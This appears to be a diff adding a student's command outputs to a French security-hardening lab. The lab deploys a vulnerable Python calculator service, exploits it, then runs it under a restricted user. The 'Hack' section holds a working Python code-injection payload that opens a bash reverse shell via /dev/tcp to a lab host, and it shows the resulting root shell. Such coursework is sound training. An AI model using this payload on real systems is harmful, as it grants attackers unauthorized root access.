@@ -34,6 +34,13 @@ D'abord, on test l'app, on prend la maîtrise dessus : vous récupérez [mon pti
 
 - avec une commande `curl` par exemple
 - stockez le fichier `calc.py` dans le répertoire `/opt/`
+```
+[dash@localhost ~]$ sudo curl https://gitlab.com/it4lik/m1-hardening-2024/-/raw/main/tp/2/calc.py -o /opt/calc.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   780  100   780    0     0   5000      0 --:--:-- --:--:-- --:--:--  5000
+
+```
 
 > On se préoccupe pas trop des permissions ou quoi pour le moment, je vous réserve une section dédiée en dessous ;D
 
@@ -44,6 +51,25 @@ D'abord, on test l'app, on prend la maîtrise dessus : vous récupérez [mon pti
 - connectez-vous avec une commande `nc` (depuis votre PC)
 - essayez d'envoyer genre "3+3" une fois connecté
 - l'app doit vous répondre "6"
+```
+[dash@localhost ~]$ sudo firewall-cmd --add-port=13337/tcp --permanent
+[sudo] password for dash: 
+success
+[dash@localhost ~]$ sudo firewall-cmd --reload
+success
+[dash@localhost ~]$ sudo python3 /opt/calc.py 
+
+
+```  
+
+```
+┌─[dashboard@parrot]─[~]
+└──╼ $nc 192.168.133.129 13337
+
+Hello3+3
+6
+
+```
 
 ## 2. Création de service
 
@@ -70,21 +96,35 @@ Description=Super serveur calculatrice
 ExecStart=/chemin/vers/le/programme/python3 /opt/calc.py
 Restart=always
 ```
+```
+[dash@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service
+[Unit]
+Description=Super serveur calculatrice
+
+[Service]
+ExecStart=/usr/bin/python3 /opt/calc.py
+Restart=always
+```
 
 🌞 **Indiquer à systemd que vous avez modifié les services**
 
 - il faut exécuter cette commande **à chaque fois** que vous modifiez un service
 - exécutez la commande suivante :
 
-```bash
-# on indique à systemd de relire les fichiers de définition de service
-sudo systemctl daemon-reload
+```
+[dash@localhost ~]$ sudo systemctl daemon-reload
 ```
 
 🌞 **Vérifier que ce nouveau service est bien reconnu***
 
 - exécutez un simple `systemctl status calculatrice`
 - le service doit être `inactive` sûrement, mais il est bien reconnu !
+```
+[dash@localhost ~]$ systemctl status calculatrice
+○ calculatrice.service - Super serveur calculatrice
+     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
+     Active: inactive (dead)
+```
 
 > Y'a pas d'erreurs genre "service calculatrice not found" truc du genre.
 
@@ -93,6 +133,9 @@ sudo systemctl daemon-reload
 - démarrage de l'application avec `sudo systemctl start calculatrice`
 - vous pouvez vous connecter depuis votre PC
 - l'affichage de l'application est disponible dans les logs : `journalctl -xe -u calculatrice`
+```
+[dash@localhost ~]$ sudo systemctl start calculatrice
+```
 
 ## 3. Hack
 
@@ -106,7 +149,46 @@ Y'a aucune protection en fait, plutôt que de saisir un calcul en tant que clien
 - depuis votre PC, vous vous connectez à l'application Python avec `nc`
 - exploitez l'application pour obtenir un shell `root`
 - dans le compte-rendu, je veux votre payload (ce que vous tapez pour obtenir le shell `root`)
+```
+─[✗]─[dashboard@parrot]─[~]
+└──╼ $nc 192.168.133.129 13337
 
+Hello(__import__('subprocess').getoutput("/bin/bash -i >& /dev/tcp/192.168.133.128/4444 0>&1"))
+
+```
+Sur ma machine  
+```
+┌─[dashboard@parrot]─[~]
+└──╼ $nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.133.128] from (UNKNOWN) [192.168.133.129] 45234
+bash: cannot set terminal process group (302520): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@localhost /]# ls
+ls
+afs
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+[root@localhost /]# 
+
+```
 > Y'a **une fonction utilisée dans le code qui est notoirement sensible** si on s'en sert mal... et là c'est genre la pire utilisation possible !
 
 ## 4. Harden
@@ -123,6 +205,12 @@ On va donc créer un utilisateur dédié, qui possède le strict nécessaire, et
 
 - avec une commande `ps` et un `grep`
 - pendant que le service `calculatrice` s'exécute
+```
+[dash@localhost ~]$ ps -ef | grep calc.py
+root      342939       1  0 15:29 ?        00:00:00 /usr/bin/python3 /opt/calc.py
+dash      344690   10782  0 15:30 pts/0    00:00:00 grep --color=auto calc.py
+
+```
 
 🌞 **Créer l'utilisateur `calculatrice`**
 
@@ -131,22 +219,44 @@ On va donc créer un utilisateur dédié, qui possède le strict nécessaire, et
   - pas de home directory
   - pas de mot de passe
   - aucun groupe particulier
+```
+[dash@localhost ~]$ sudo useradd -M -N -s /sbin/nologin calculatrice
+```
 
 🌞 **Adaptez les permissions**
 
 - le fichier `/opt/calc.py` doit appartenir à notre nouvel utilisateur
 - le fichier `/opt/calc.py` doit appartenir à notre nouveau groupe
 - les permissions doivent être les plus restrictives possibles pour que le service fonctionne
+```
+[dash@localhost ~]$ sudo chown calculatrice:calculatrice /opt/calc.py 
+[dash@localhost ~]$ ls -l /opt/calc.py 
+-rwxr-x---. 1 calculatrice calculatrice 780 Feb 11 14:01 /opt/calc.py
+
+```
 
 🌞 **Modifier le `.service`**
 
 - ajoutez la clause `User=calculatrice`
 - n'oubliez pas de `sudo systemctl daemon-reload` pour que le changement prenne effet
 - redémarrez le service
+```
+[dash@localhost ~]$ sudo nano /etc/systemd/system/calculatrice.service
+User=calculatrice
+[dash@localhost ~]$ sudo systemctl daemon-reload
+[dash@localhost ~]$ sudo systemctl restart calculatrice
+
+```
 
 🌞 **Prouvez que le service s'exécute désormais en tant que `calculatrice`**
 
 - avec une commande `ps` et un `grep`
+```
+[dash@localhost ~]$ ps -ef | grep calc.py
+calcula+  389956       1  1 15:53 ?        00:00:00 /usr/bin/python3 /opt/calc.py
+dash      390043   10782  0 15:53 pts/0    00:00:00 grep --color=auto calc.py
+
+```
 
 ### B. Syscalls
 
